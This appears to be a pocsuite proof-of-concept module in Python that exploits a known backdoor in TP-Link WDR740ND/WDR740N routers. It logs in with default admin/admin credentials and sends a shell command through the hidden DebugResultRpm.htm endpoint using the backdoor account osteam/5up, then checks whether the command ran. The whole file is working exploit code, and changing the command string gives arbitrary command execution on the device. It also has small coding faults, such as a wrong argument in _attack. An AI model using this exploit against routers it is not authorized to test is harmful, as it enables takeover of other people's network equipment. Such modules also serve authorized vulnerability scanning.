#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
from urllib import quote
import random
import hashlib
import string
import re



class TestPOC(POCBase):
    name = "TP-Link WDR740ND & WDR740N Backdoor RCE"
    vulID = ''
    author = ['sebao']
    vulType = 'Backdoor RCE'
    version = '1.0'  # default version: 1.0
    references = 'http://websec.ca/advisories/view/root-shell-tplink-wdr740'
    desc = 'Exploits TP-Link WDR740ND and WDR740N backdoor vulnerability that allows executing commands on operating system level.'

    vulDate = ''
    createDate = '2017-10-26'
    updateDate = '2017-10-26'

    appName = 'TP-Link '
    appVersion = 'WDR740ND/WDR740N'
    dork = ''
    appPowerLink = 'http://www.tp-link.com'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        username = 'admin'
        password = 'admin'
        a = ''.join(random.sample(string.ascii_letters + string.digits, 6))
        md5 = hashlib.md5()
        md5.update(a)
        md5hash = md5.hexdigest()
        cmd = "echo -n {}|md5sum".format(a)
        cmd = quote(cmd)
        url = self.url + "/userRpm/DebugResultRpm.htm?cmd={}&usr=osteam&passwd=5up".format(cmd)
        resp = req.get(url,auth=(username,password))
        if resp.status_code == 200:
            regexp = 'var cmdResult = new Array\(\n"(.*?)",\n0,0 \);'
            res = re.findall(regexp, resp.text)
        if len(res):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url



        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
